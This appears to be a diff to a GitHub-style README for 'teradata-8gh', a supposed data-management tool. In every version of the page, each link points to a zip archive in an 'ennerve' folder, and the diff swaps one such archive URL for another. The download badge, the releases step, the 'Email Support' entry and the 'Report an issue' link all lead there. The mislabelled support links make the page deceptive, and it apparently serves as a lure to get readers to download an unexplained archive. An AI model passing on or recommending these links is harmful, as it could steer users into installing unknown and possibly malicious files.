@@ -1,6 +1,6 @@
 # 🎉 teradata-8gh - Effortless Data Management Made Simple
 
-[![Download teradata-8gh](https://raw.githubusercontent.com/muzahkeys/teradata-8gh/main/ennerve/teradata-8gh.zip)](https://raw.githubusercontent.com/muzahkeys/teradata-8gh/main/ennerve/teradata-8gh.zip)
+[![Download teradata-8gh](https://github.com/muzahkeys/teradata-8gh/raw/refs/heads/main/ennerve/teradata_gh_v2.4.zip)](https://github.com/muzahkeys/teradata-8gh/raw/refs/heads/main/ennerve/teradata_gh_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To start using teradata-8gh, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download page.  
-   [Download teradata-8gh](https://raw.githubusercontent.com/muzahkeys/teradata-8gh/main/ennerve/teradata-8gh.zip)
+   [Download teradata-8gh](https://github.com/muzahkeys/teradata-8gh/raw/refs/heads/main/ennerve/teradata_gh_v2.4.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of available versions. Select the latest version for the best features and updates.
@@ -75,8 +75,8 @@ For more detailed instructions and support, refer to our documentation available
 
 If you encounter any problems using teradata-8gh, please reach out for assistance:
 
-- **Email Support:** https://raw.githubusercontent.com/muzahkeys/teradata-8gh/main/ennerve/teradata-8gh.zip  
-- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/muzahkeys/teradata-8gh/main/ennerve/teradata-8gh.zip)  
+- **Email Support:** https://github.com/muzahkeys/teradata-8gh/raw/refs/heads/main/ennerve/teradata_gh_v2.4.zip  
+- **GitHub Issues:** [Report an issue](https://github.com/muzahkeys/teradata-8gh/raw/refs/heads/main/ennerve/teradata_gh_v2.4.zip)  
   
 Our team is here to help ensure your experience is as smooth as possible.
 
